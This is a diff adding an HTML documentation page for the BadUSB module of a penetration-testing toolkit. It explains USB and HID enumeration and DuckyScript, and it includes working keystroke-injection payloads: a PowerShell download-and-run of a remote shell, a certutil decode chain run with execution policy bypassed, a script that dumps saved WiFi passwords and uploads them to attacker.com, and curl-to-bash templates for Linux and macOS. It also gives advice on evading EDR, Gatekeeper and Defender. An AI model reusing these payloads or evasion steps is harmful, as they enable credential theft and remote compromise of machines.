+          </tbody>
+        </table>
+        </div>
+      </section>
+
+      <!-- OPSEC -->
+      <section id="opsec">
+        <p class="sec-label">Operational Security</p>
+        <h2>OPSEC considerations</h2>
+
+        <div class="callout crit">
+          <span class="callout-mark">!</span>
+          <span>BadUSB attacks require physical access to the target machine. Unauthorized physical access to computer systems is a serious criminal offence. Only conduct this type of testing with explicit written authorization from the system owner.</span>
+        </div>
+
+        <h3>Detection risks</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Vector</th><th>Risk level</th><th>Mitigation</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>USB device in port</td>
+              <td>Physical — visible to anyone nearby</td>
+              <td>Use O.MG Cable (looks like a charge cable) or a device disguised as a peripheral</td>
+            </tr>
+            <tr>
+              <td>PowerShell window visible</td>
+              <td>Medium — user may see it flash open</td>
+              <td>Add a <code>MINIMIZEWINDOW</code> or Win+D keystroke to minimize early. Modern Ducky payloads can open PowerShell hidden.</td>
+            </tr>
+            <tr>
+              <td>certutil execution logged by EDR</td>
+              <td>Medium — certutil abuse is well-known</td>
+              <td>Replace with <code>[System.Convert]::FromBase64String</code> PowerShell inline decode (no certutil binary call)</td>
+            </tr>
+            <tr>
+              <td>Payload file on disk at %TEMP%</td>
+              <td>Low — temp folder, usually cleaned on reboot</td>
+              <td>Add a <code>del %TEMP%\p.ps1</code> line after execution (set <code>cleanup true</code>)</td>
+            </tr>
+            <tr>
+              <td>Reverse shell callback</td>
+              <td>High if monitored — outbound connection</td>
+              <td>Use an encrypted payload (Meterpreter HTTPS) and a WAN bore tunnel; connection looks like HTTPS traffic</td>
+            </tr>
+          </tbody>
+        </table>
+        </div>
+      </section>
+
+      <!-- ══════════ ARCHITECTURE DEEP DIVE ══════════ -->
+      <section id="arch-deep-dive">
+        <p class="sec-label">Internals</p>
+        <h2>Architecture Deep Dive</h2>
+        <p>
+          This chapter explains exactly what happens at the USB and HID protocol layers when a BadUSB
+          device is plugged in — from the USB enumeration handshake to individual keystroke bytes.
+          It also covers how secV generates DuckyScript and how to write your own payloads.
+        </p>
+      </section>
+
+      <section id="usb-enum">
+        <p class="sec-label">Internals</p>
+        <h2>USB Enumeration — What Happens When You Plug In</h2>
+        <p>
+          When any USB device is plugged in, the host OS performs a <strong>USB enumeration</strong>:
+          a discovery protocol where the host queries the device for its capabilities. BadUSB exploits
+          this process by presenting a HID (Human Interface Device) class descriptor — making the OS
+          treat it as a keyboard.
+        </p>
+        <pre><code><span class="comment">## USB Enumeration sequence (full protocol)</span>
+
+1. Device connects → USB D+/D- lines signal presence
+2. Host resets the device (SE0 condition for ≥10ms)
+3. Host requests Device Descriptor (18 bytes):
+   ┌──────────────────────────────────────────────────────┐
+   │ bLength=18  bDescriptorType=0x01 (Device)           │
+   │ bcdUSB=0x0200  (USB 2.0)                            │
+   │ bDeviceClass=0x00  (class defined per interface)     │
+   │ idVendor=0x05AC  idProduct=0x0221  (e.g., Apple KB) │
+   │ bcdDevice=0x0100  iManufacturer iProduct iSerial     │
+   │ bNumConfigurations=1                                 │
+   └──────────────────────────────────────────────────────┘
+   <span class="comment"># BadUSB chooses VID:PID to match a trusted manufacturer</span>
+   <span class="comment"># 0x05AC = Apple, 0x046D = Logitech, 0x045E = Microsoft</span>
+
+4. Host requests Configuration Descriptor:
+   ┌──────────────────────────────────────────────────────┐
+   │ bLength=9   bDescriptorType=0x02 (Configuration)    │
+   │ wTotalLength=34  bNumInterfaces=1                   │
+   │ bConfigurationValue=1  iConfiguration=0             │
+   │ bmAttributes=0xA0  bMaxPower=50 (100mA)             │
+   └──────────────────────────────────────────────────────┘
+
+5. Host reads Interface Descriptor:
+   ┌──────────────────────────────────────────────────────┐
+   │ bLength=9   bDescriptorType=0x04 (Interface)        │
+   │ bInterfaceNumber=0  bAlternateSetting=0             │
+   │ bNumEndpoints=1  bInterfaceClass=0x03               │
+   │                  ↑ 0x03 = HID class!                │
+   │ bInterfaceSubClass=0x01  (boot interface subclass)  │
+   │ bInterfaceProtocol=0x01  (keyboard protocol)        │
+   └──────────────────────────────────────────────────────┘
+
+6. Host reads HID Descriptor:
+   ┌──────────────────────────────────────────────────────┐
+   │ bLength=9  bDescriptorType=0x21 (HID)               │
+   │ bcdHID=0x0110  (HID spec 1.10)                      │
+   │ bCountryCode=0x00  bNumDescriptors=1                │
+   │ bDescriptorType=0x22  wDescriptorLength=63          │
+   │ ↑ Report Descriptor follows (63 bytes)              │
+   └──────────────────────────────────────────────────────┘
+
+7. Host reads HID Report Descriptor — tells OS the report format:
+   06 00 FF   <span class="comment"># Usage Page (Generic Desktop)</span>
+   09 01      <span class="comment"># Usage (Pointer)</span>
+   ...
+   <span class="comment"># For a keyboard, the report descriptor defines:</span>
+   <span class="comment"># - 1 byte: modifier keys (Shift, Ctrl, Alt, GUI)</span>
+   <span class="comment"># - 1 byte: reserved</span>
+   <span class="comment"># - 6 bytes: keycodes (up to 6 simultaneous)</span>
+
+8. Host assigns device address, installs HID driver
+   → OS now treats device as keyboard — zero user interaction required</code></pre>
+
+        <div class="callout">
+          <span class="callout-mark">!</span>
+          <span>The entire USB enumeration takes less than 500ms. By the time the user notices
+          anything, the OS has already installed the HID driver and the "keyboard" is sending keystrokes.</span>
+        </div>
+      </section>
+
+      <section id="hid-report-descriptor">
+        <p class="sec-label">Internals</p>
+        <h2>HID Report Descriptor — Defining the Keyboard Format</h2>
+        <p>
+          The HID Report Descriptor is a variable-length byte array that tells the host exactly what
+          format the device's reports use. For a standard keyboard, the reference descriptor is:
+        </p>
+        <pre><code><span class="comment">## Standard USB keyboard HID Report Descriptor (hexdump + annotation)</span>
+05 01     Usage Page (Generic Desktop Controls)
+09 06     Usage (Keyboard)
+A1 01     Collection (Application)
+  05 07  Usage Page (Keyboard/Keypad)
+  19 E0  Usage Minimum (0xE0 = Left Control)
+  29 E7  Usage Maximum (0xE7 = Right GUI)
+  15 00  Logical Minimum (0)
+  25 01  Logical Maximum (1)
+  75 01  Report Size (1 bit)
+  95 08  Report Count (8)   ← 8 × 1-bit = 1 modifier byte
+  81 02  Input (Data, Variable, Absolute)   ← modifier bits
+
+  95 01  Report Count (1)
+  75 08  Report Size (8 bits)
+  81 01  Input (Constant)   ← 1 reserved byte (always 0x00)
+
+  95 06  Report Count (6)
+  75 08  Report Size (8 bits)
+  15 00  Logical Minimum (0)
+  25 DD  Logical Maximum (0xDD = 221)
+  05 07  Usage Page (Keyboard)
+  19 00  Usage Minimum (0)
+  29 DD  Usage Maximum (221)
+  81 00  Input (Data, Array)   ← 6 keycode bytes
+
+C0       End Collection
+
+<span class="comment">## Total report size: 1 (modifier) + 1 (reserved) + 6 (keycodes) = 8 bytes</span>
+<span class="comment">## This matches the HID report format secV sends: A1 01 [mod] [00] [k1..k6]</span></code></pre>
+      </section>
+
+      <section id="duckyscript-internals">
+        <p class="sec-label">Internals</p>
+        <h2>DuckyScript — Command Reference and Encoding</h2>
+        <p>
+          DuckyScript is a simple scripting language designed for USB Rubber Ducky. secV's badusb module
+          generates DuckyScript payloads. Here is the complete command reference with exactly what each
+          command translates to at the HID report level.
+        </p>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>DuckyScript Command</th><th>HID Reports Generated</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td><code>STRING hello</code></td><td>5 key-down + 5 key-up pairs</td><td>One pair per character; modifier set for uppercase</td></tr>
+            <tr><td><code>ENTER</code></td><td>1 key-down (0x28) + 1 key-up</td><td>0x28 = Return/Enter HID usage</td></tr>
+            <tr><td><code>DELAY 500</code></td><td>No reports — 500ms sleep</td><td>Critical on slow targets; increases reliability</td></tr>
+            <tr><td><code>GUI r</code></td><td>1 key-down (mod=0x08, key=0x15) + key-up</td><td>0x08=Left GUI bit; 0x15='r' usage ID</td></tr>
+            <tr><td><code>CTRL c</code></td><td>1 key-down (mod=0x01, key=0x06) + key-up</td><td>0x01=Left Ctrl; 0x06='c'</td></tr>
+            <tr><td><code>ALT F4</code></td><td>1 key-down (mod=0x04, key=0x3D) + key-up</td><td>0x04=Left Alt; 0x3D=F4</td></tr>
+            <tr><td><code>SHIFT TAB</code></td><td>1 key-down (mod=0x02, key=0x2B) + key-up</td><td>0x02=Left Shift; 0x2B=Tab</td></tr>
+            <tr><td><code>UPARROW</code></td><td>1 key-down (mod=0, key=0x52) + key-up</td><td>Arrow keys: Up=0x52, Down=0x51, Left=0x50, Right=0x4F</td></tr>
+            <tr><td><code>CAPSLOCK</code></td><td>1 key-down (key=0x39) + key-up</td><td>Toggle key — state depends on current lock state</td></tr>
+            <tr><td><code>REPEAT 3</code></td><td>Repeats previous line's reports 3 more times</td><td>Efficient for repeated key presses</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>How secV Encodes Your PowerShell as DuckyScript</h3>
+        <pre><code><span class="comment">## Input: your PowerShell script (payload.ps1)</span>
+IEX (New-Object Net.WebClient).DownloadString('http://bore.pub:38521/shell.ps1')
+
+<span class="comment">## Step 1: secV base64-encodes the script</span>
+import base64
+encoded = base64.b64encode(open("payload.ps1","rb").read()).decode()
+<span class="comment"># Result: "SUVY..."  (standard base64)</span>
+
+<span class="comment">## Step 2: secV wraps in certutil decode command</span>
+cmd = f'echo {encoded} > %TEMP%\p.b64 && certutil -decode %TEMP%\p.b64 %TEMP%\p.ps1 && powershell -ep bypass -File %TEMP%\p.ps1'
+
+<span class="comment">## Step 3: secV generates DuckyScript</span>
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -w hidden
+ENTER
+DELAY 800
+STRING {cmd}
+ENTER
+DELAY 200
+
+<span class="comment">## The DELAY values are the delay_after_ps parameter</span>
+<span class="comment">## For slow machines (old hardware, cold boot): increase to 2000ms</span>
+<span class="comment">## For fast machines (modern SSD, already booted): 500-800ms is fine</span></code></pre>
+
+        <h3>Writing Your Own Payload From Scratch</h3>
+        <pre><code><span class="comment">## Example: exfiltrate WiFi passwords via DuckyScript (Windows)</span>
+DELAY 1000
+GUI r
+DELAY 600
+STRING cmd /k
+ENTER
+DELAY 800
+
+<span class="comment">## Export all WiFi profiles with passwords to a file, then upload</span>
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j & netsh wlan show profiles %j key=clear 2>nul | findstr "Key Content" >> %TEMP%\wifi.txt
+ENTER
+DELAY 500
+
+<span class="comment">## Upload via curl (present on Windows 10+)</span>
+STRING curl -s -X POST -F "f=@%TEMP%\wifi.txt" https://attacker.com/upload
+ENTER
+DELAY 500
+
+<span class="comment">## Cleanup</span>
+STRING del %TEMP%\wifi.txt
+ENTER
+STRING exit
+ENTER</code></pre>
+      </section>
+
+      <section id="badusb-customization">
+        <p class="sec-label">Extend</p>
+        <h2>Customization &amp; Extension</h2>
+
+        <h3>Adding a New Delivery Template</h3>
+        <pre><code><span class="comment"># badusb.py — DELIVERY_TEMPLATES dict</span>
+<span class="comment"># Each template is a function(payload_b64, params) → DuckyScript string</span>
+
+def template_linux_xterm(payload_b64: str, params: dict) -&gt; str:
+    """Deliver payload on Linux desktop via xterm."""
+    delay = params.get("delay_after_ps", 1000)
+    return f"""DELAY 1000
+CTRL ALT t
+DELAY {delay}
+STRING echo {payload_b64} | base64 -d | bash
+ENTER
+DELAY 500"""
+
+def template_macos_terminal(payload_b64: str, params: dict) -&gt; str:
+    """Deliver payload on macOS via Terminal."""
+    delay = params.get("delay_after_ps", 1200)
+    return f"""DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY {delay}
+STRING echo {payload_b64} | base64 -d | bash
+ENTER"""
+
+DELIVERY_TEMPLATES = {
+    "windows": template_windows_certutil,   <span class="comment"># existing default</span>
+    "linux":   template_linux_xterm,        <span class="comment"># yours</span>
+    "macos":   template_macos_terminal,     <span class="comment"># yours</span>
+}
+
+<span class="comment"># Usage: set template linux</span></code></pre>
+
+        <h3>Targeting macOS — Key Differences</h3>
+        <pre><code><span class="comment">## macOS DuckyScript differences vs Windows</span>
+
+GUI key    → macOS uses CMD (not Win/Meta) for system shortcuts
+             GUI SPACE → Spotlight search
+             GUI r     → does NOT open Run dialog (that's Windows)
+
+ALT F4     → macOS: CMD Q (quit application)
+
+<span class="comment">## macOS keyboard shortcuts for opening terminal:</span>
+GUI SPACE → type "terminal" → ENTER   (Spotlight)
+CTRL ALT t → does not work on macOS (that's Linux GNOME default)
+
+<span class="comment">## macOS payload delivery — avoid certutil (not present):</span>
+<span class="comment">## Use base64 built-in (available on all macOS):</span>
+STRING echo PAYLOAD_B64 | base64 --decode | bash
+
+<span class="comment">## Or use curl (always present):</span>
+STRING curl -s http://bore.pub:38521/shell.sh | bash
+
+<span class="comment">## Security note: macOS Gatekeeper may block the downloaded file</span>
+<span class="comment">## piping directly to bash bypasses Gatekeeper (no file written to disk)</span></code></pre>
+      </section>
+
+      <section id="learning-path">
+        <p class="sec-label">Study</p>
+        <h2>Learning Path &amp; Resources</h2>
+        <p>
+          BadUSB combines USB hardware, HID protocol knowledge, and scripting. Build each layer from scratch.
+        </p>
+
+        <h3>Step 1: USB and HID Basics</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Type</th><th>Why</th></tr></thead>
+          <tbody>
+            <tr><td>USB in a NutShell (beyondlogic.org/usbnutshell)</td><td>Free</td><td>Best free USB tutorial online. Covers descriptors, enumeration, HID class — exactly what the USB Enumeration section above describes. Read chapters 1-5.</td></tr>
+            <tr><td>HID Specification (usb.org/hid) — free download</td><td>Free spec</td><td>The official HID spec. Section 5 covers the report descriptor format. Understanding this means you can build your own HID device from scratch.</td></tr>
+            <tr><td>USB Rubber Ducky Wiki (docs.hak5.org)</td><td>Free</td><td>Hak5's official DuckyScript reference. Full command list, firmware versions, hardware specs. secV's badusb generates compatible DuckyScript.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 2: Hands-On Labs</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Setup</th><th>Cost</th><th>Focus</th></tr></thead>
+          <tbody>
+            <tr><td>DigiSpark ATTiny85 USB board</td><td>~$3-5 on AliExpress</td><td>The cheapest BadUSB hardware. Runs Arduino code that emulates HID keyboard. Flash custom payloads to it via Arduino IDE. Same attack as USB Rubber Ducky at 1/20th the cost.</td></tr>
+            <tr><td>Flipper Zero</td><td>~$169</td><td>Multi-tool that includes BadUSB functionality. Run your secV-generated DuckyScript directly on it via SD card.</td></tr>
+            <tr><td>Virtual Machine (Windows target)</td><td>Free</td><td>Test your DuckyScript payloads inside a VM before using real hardware. Paste the key sequence manually (or use AutoHotkey to replay it) to verify the payload works.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 3: PowerShell and Windows Internals</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Focus</th></tr></thead>
+          <tbody>
+            <tr><td>PowerShell for Pentesters (TryHackMe room)</td><td>Learn the PowerShell commands that badusb payloads use — <code>IEX</code>, <code>New-Object</code>, <code>certutil</code>, <code>DownloadString</code>.</td></tr>
+            <tr><td>LOLBAS Project (lolbas-project.github.io)</td><td>Living Off The Land Binaries, Scripts and Libraries — Windows built-ins that can download/execute code. certutil is just one of 100+ documented LOLBins. badusb uses certutil by default — this reference shows alternatives.</td></tr>
+            <tr><td>PowerShell Empire documentation</td><td>Advanced PowerShell C2 payloads. Build custom payloads for badusb's delivery stage beyond the basic reverse shell.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Step 4: Deep Reference</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Resource</th><th>Use For</th></tr></thead>
+          <tbody>
+            <tr><td>Hak5 Payload Hub (payloadhub.com)</td><td>Community DuckyScript payloads. Browse to find attack templates, then understand how they work using the DuckyScript internals section above.</td></tr>
+            <tr><td>Flipper Zero BadUSB documentation</td><td>Flipper Zero's HID implementation details — slightly different from Rubber Ducky in timing. Use when badusb payloads work on Rubber Ducky but not Flipper.</td></tr>
+            <tr><td>Windows 10/11 Security Baselines (Microsoft)</td><td>Understand what Group Policy settings block BadUSB attacks — useful for both red team (bypass) and blue team (defense) perspectives.</td></tr>
+          </tbody>
+        </table>
+        </div>
+
+        <h3>Practice Path</h3>
+        <pre><code><span class="comment">## Progression: from generating your first payload to custom delivery</span>
+
+Week 1: Generate and Understand
+  Run: badusb with your test payload.ps1
+  Read: the generated DuckyScript output line by line
+  Trace: each command in the DuckyScript internals section
+  Goal: understand every byte before any hardware touches a computer
+
+Week 2: Test in a VM
+  Setup: Windows 10 VM (use Windows 10 evaluation ISO — free 90 days)
+  Manually: paste the DuckyScript key sequence using AutoHotkey
+  Verify: the payload executes correctly in the VM
+  Debug: if it fails, identify which DELAY needs to be longer
+
+Week 3: Hardware
+  Order: DigiSpark ATTiny85 ($3-5)
+  Flash: your badusb payload via Arduino IDE
+  Test: in your own Windows 10 VM only
+  Observe: the full attack from plug-in to shell
+
+Week 4: Evasion
+  Read: LOLBAS project — find certutil alternatives
+  Modify: the delivery template to use certutil alternatives
+  Test: does Windows Defender flag the new approach?
+  Document: your findings (this is bug bounty / red team report material)</code></pre>
+      </section>
+
+    </div><!-- /content -->
+  </div><!-- /doc-body -->
+</div><!-- /page -->
+
+<footer>
+  <div class="foot-inner">
+    <a class="foot-brand" href="../index.html">SECVULNHUB</a>
+    <div class="foot-links">
+      <a class="foot-link" href="../index.html">Home</a>
+      <a class="foot-link" href="https://github.com/secvulnhub" target="_blank">GitHub</a>
+      <a class="foot-link" href="../index.html#modules">Modules</a>
+    </div>
+    <span class="foot-note">secV v2.4.2 — badusb v1.0.0</span>
+  </div>
+</footer>
+
+<script>
+const nav = document.getElementById('nav');
+window.addEventListener('scroll', () => { nav.classList.toggle('scrolled', window.scrollY > 20); });
+document.getElementById('burger').addEventListener('click', () => { document.body.classList.toggle('nav-open'); });
+const links = document.querySelectorAll('.sidebar-nav a');
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      links.forEach(l => l.classList.remove('active'));
+      const match = document.querySelector(`.sidebar-nav a[href="#${e.target.id}"]`);
+      if (match) match.classList.add('active');
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('section[id]').forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
